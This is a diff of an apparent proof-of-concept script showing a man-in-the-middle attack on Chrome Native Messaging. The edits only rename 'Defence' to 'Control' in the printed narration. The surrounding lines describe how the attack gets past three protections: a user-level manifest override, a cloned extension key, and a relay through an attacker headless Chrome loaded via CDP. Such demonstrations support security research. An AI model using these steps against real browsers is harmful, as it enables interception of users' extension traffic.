@@ -57,8 +57,8 @@ def banner():
     print("  Native Messaging channel interception via 4-component relay")
     print("="*65)
 
-def defence(n, msg):
-    print(f"\n  Defence {n}: {msg}")
+def control(n, msg):
+    print(f"\n  Control {n}: {msg}")
 
 def step(n, title):
     print(f"\n  Step {n}: {title}")
@@ -400,13 +400,13 @@ async def launch_attacker_chrome(ext_id):
 def run_setup():
     banner()
 
-    print("\n  Defences in place:")
-    defence(1, "The NM manifest is installed at the system level "
-               "(/Library/Google/Chrome/NativeMessagingHosts/) — "
+    print("\n  Controls in place:")
+    control(1, "The NM manifest is installed at the system level "
+               "(/Library/Google/Chrome/NativeMessagingHosts/), "
                "root-owned, requires administrator privileges to modify.")
-    defence(2, "The manifest lists allowed_origins — Chrome only forwards "
+    control(2, "The manifest lists allowed_origins, Chrome only forwards "
                "connections from the specific victim extension ID to this host.")
-    defence(3, "The demo victim host verifies its parent process is Google Chrome "
+    control(3, "The demo victim host verifies its parent process is Google Chrome "
                "before responding to any request.")
 
     pause()
@@ -421,7 +421,7 @@ def run_setup():
         info("System-level manifest not found. Run install.sh first.")
         sys.exit(1)
 
-    bypass("Bypassing Defence 1: the user-level NM directory is always writable — "
+    bypass("Bypassing Control 1: the user-level NM directory is always writable, "
            "a same-named file there silently overrides the system-level entry.")
 
     pause()
@@ -446,7 +446,7 @@ def run_setup():
     info("")
     info("The passthrough extension must carry the same key to pass allowed_origins.")
 
-    bypass("Bypassing Defence 2: passthrough extension carries the victim's key — "
+    bypass("Bypassing Control 2: passthrough extension carries the victim's key, "
            "same ID, allowed_origins passes.")
 
     pause()
@@ -482,7 +482,7 @@ def run_setup():
     info("Chrome spawns the MITM wrapper (parent = victim Chrome) and the real host")
     info("(parent = attacker headless Chrome). Both parent checks pass, no spoofing.")
 
-    bypass("Bypassing Defence 3: both parents are genuine Chrome processes.")
+    bypass("Bypassing Control 3: both parents are genuine Chrome processes.")
 
     pause()
 
@@ -536,7 +536,7 @@ async def _relay_main(ext_id):
     info(f"Relay upstream   (passthrough extension): ws://127.0.0.1:{WS_UPSTREAM}")
     info(f"Relay downstream (MITM wrapper)         : ws://127.0.0.1:{WS_DOWNSTREAM}")
 
-    bypass("Defence 3 satisfied: real host's parent is attacker headless Chrome.")
+    bypass("Control 3 satisfied: real host's parent is attacker headless Chrome.")
     bypass("Developer mode restriction bypassed via CDP Extensions.loadUnpacked.")
 
     srv_up = await websockets.serve(relay.handle_upstream, "127.0.0.1", WS_UPSTREAM)
